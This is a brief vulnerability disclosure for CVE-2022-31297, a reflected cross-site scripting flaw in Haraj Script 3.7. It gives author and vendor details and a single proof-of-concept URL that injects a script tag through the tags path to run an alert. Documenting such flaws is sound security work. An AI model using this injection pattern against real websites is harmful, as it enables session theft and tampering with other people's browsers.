# CVE-2022-31297
Haraj Script 3.7 - Reflected XSS

#### Exploit Title: Haraj Script 3.7 - Reflected XSS
#### Date: 2022-06-13
#### CVE: CVE-2022-31297
#### Exploit Author: Abdulaziz Saad (@b4zb0z)
#### Vendor Homepage: https://angtech.org/
#### Software Link: https://angtech.org/product/view/3
#### Version: 3.7
#### Tested on: LAMP, Ubuntu

---

[#] Exploitation :
	`https://localhost/harajnext/tags/test%3C/title%3E%3Cscript%3Ealert(String.fromCharCode(98,52,122,98,48,122))%3C/script%3E`
